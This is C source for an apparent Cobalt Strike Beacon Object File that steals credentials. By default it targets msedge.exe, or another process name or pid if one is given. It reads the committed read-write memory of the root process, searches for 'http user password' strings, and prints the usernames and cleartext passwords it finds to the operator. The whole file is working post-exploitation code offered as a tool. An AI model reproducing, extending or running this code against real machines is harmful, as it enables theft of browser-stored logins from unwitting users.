#include "beacon.h"
#include "common.h"

typedef struct _PidEntry {
    DWORD pid;
    DWORD ppid;
    struct _PidEntry *next;
} PidEntry;

int memcmp2(const void *s1, const void *s2, size_t n) {
    const unsigned char *s1ptr = (const unsigned char *)s1;
    const unsigned char *s2ptr = (const unsigned char *)s2;

    for (size_t i = 0; i < n; i++) {
        if (s1ptr[i] != s2ptr[i]) {
            return 1;
        }
    }
    return 0;
}

void *memmem2(const void *haystack, size_t haystackLen, const void *needle, size_t needleLen) {
    if (needleLen > haystackLen) {
        return NULL;
    }
    const unsigned char *haystackPtr = (const unsigned char *)haystack;

    for (size_t i = 0; i <= haystackLen - needleLen; i++) {
        if (memcmp2(haystackPtr + i, needle, needleLen) == 0) {
            return (void*)(haystackPtr+i);
        }
    }
    return NULL;
}

int isalpha2(int c) {
    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');
}

size_t strlen2(const char *s) {
    const char *p = s;
    while (*p) {
        p++;
    }
    return p-s;
}

LPVOID *malloc2(SIZE_T len) {
    return KERNEL32$VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

BOOL free2(LPVOID pMemory) {
    KERNEL32$VirtualFree(pMemory, 0, MEM_RELEASE);
}

PidEntry *NewPidEntry(DWORD pid, DWORD ppid, PidEntry *next) {
    PidEntry *pe = (PidEntry *)malloc2(sizeof(PidEntry));
    pe->pid = pid;
    pe->ppid = ppid;
    pe->next = next;
    return pe;
}

#ifdef PRINT_PROCESS_OWNER
void printTokenInfo(HANDLE hProc) {
    HANDLE hToken;

    // open process token
    if (!KERNEL32$OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
        BeaconPrintf(0, "[-] Failed to get process token");
        return;
    }

    // get token user
    BYTE buffer[256];
    DWORD bufferSize;
    
    ADVAPI32$GetTokenInformation(hToken, TokenUser, buffer, sizeof(buffer), &bufferSize);

    // extract sid
    TOKEN_USER *tu = (TOKEN_USER *)buffer;
    PSID sid = tu->User.Sid;

    // sid -> name
    char name[64];
    char domain[64];
    DWORD cchName = 64;
    DWORD cchDomain = 64;
    SID_NAME_USE use;
    
    ADVAPI32$LookupAccountSidA(NULL, sid, name, &cchName, domain, &cchDomain, &use);

    BeaconPrintf(0, "[+] Process owner: %s\\%s\n", domain, name);
}
#endif

void scanProcessByPid(DWORD pid) {
    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProc == NULL) {
        BeaconPrintf(0, "[-] Failed to open process: %d\n", pid);
        return;
    }
    BeaconPrintf(0, "[+] Process opened: %d\n", pid);

#ifdef PRINT_PROCESS_OWNER
    printTokenInfo(hProc);
#endif

    MEMORY_BASIC_INFORMATION2 mbi;
    unsigned char *pAddress = NULL;

    while (KERNEL32$VirtualQueryEx(hProc, pAddress, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        pAddress += mbi.RegionSize;

        BOOL probable = mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE;
        if (!probable) {
            continue;
        }

        LPVOID pMemory = malloc2(mbi.RegionSize);

        SIZE_T nBytes = 0;
        if (KERNEL32$ReadProcessMemory(hProc, mbi.BaseAddress, pMemory, mbi.RegionSize, &nBytes)) {
            unsigned char *ptr = (unsigned char *) pMemory;
            for (size_t i = 1; i < mbi.RegionSize; i++) {
                if (isalpha2(ptr[i-1]) == 1 && (memcmp2(ptr+i, "http ", 5) == 0 || memcmp2(ptr+i, "https ", 6) == 0)) {
                    for (size_t j = i; j < mbi.RegionSize; j++) {
                        if (ptr[j] == 0) {
                            if (ptr[j-1] == 0x20) {
                                char *username = memmem2(ptr+i, j-i, " ", 1) + 1;
                                char *password = memmem2(username, 0x20, " ", 1) + 1;
                                int usernameLen = password - username - 1;
                                BeaconPrintf(0, "[+] Username: %.*s\n", usernameLen, username);
                                BeaconPrintf(0, "    Password: %s\n\n", password);
                            }
                            break;
                        }
                    }
                }
            }
        }
        free2(pMemory);
    }

    KERNEL32$CloseHandle(hProc);
}

int strcmpw2(const wchar_t *s1, const wchar_t *s2) {
    const wchar_t *p1 = s1;
    const wchar_t *p2 = s2;

    while (*p1 && *p2) {
        if (*p1 != *p2) {
            return 1;
        }
        p1++;
        p2++;
    }
    return *p1 || *p2;
}

void scanProcessesByName(char *procname) {
    BeaconPrintf(0, "[*] Searching for '%s'\n", procname);
    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        BeaconPrintf(0, "[-] Failed to get process snapshot\n");
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    PidEntry *pidEntry = NULL;

    size_t procnameLen2 = strlen2(procname) * 2;
    WCHAR wprocname[256] = {0};
    toWideChar(procname, wprocname, sizeof(wprocname));

    // build a set of (pid,ppid)
    if (KERNEL32$Process32FirstW(snap, &pe)) {
        do {
            if (strcmpw2(pe.szExeFile, wprocname) != 0) {
                continue;
            }

            pidEntry = NewPidEntry(pe.th32ProcessID, pe.th32ParentProcessID, pidEntry);
        } while (KERNEL32$Process32NextW(snap, &pe));
    }
    KERNEL32$CloseHandle(snap);

    // we only want the "root" process, so we can discard all processes that have
    // been started by e.g "msedge.exe"
    for (PidEntry *i = pidEntry; i != NULL; i = i->next) {
        int found = 0;
        for (PidEntry *j = pidEntry; j != NULL; j = j->next) {
            if (j->pid == i->ppid) {
                found = 1;
                break;
            }
        }

        if (found == 0) {
            scanProcessByPid(i->pid);
        }
    }

    // free the pids!
    while (pidEntry != NULL) {
        PidEntry *next = pidEntry->next;
        free2(pidEntry);
        pidEntry = next;
    }
}

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *procname = BeaconDataExtract(&parser, NULL);
    int pid = BeaconDataInt(&parser);

    if (pid != 0 && (procname != NULL && procname[0])) {
        BeaconPrintf(0, "[-] Can't specify both a process name and a pid\n");
        return;
    }

    if (pid != 0) {
        scanProcessByPid(pid);
    } else if (procname != NULL && procname[0]) {
        scanProcessesByName(procname);
    } else {
        scanProcessesByName("msedge.exe");
    }
}
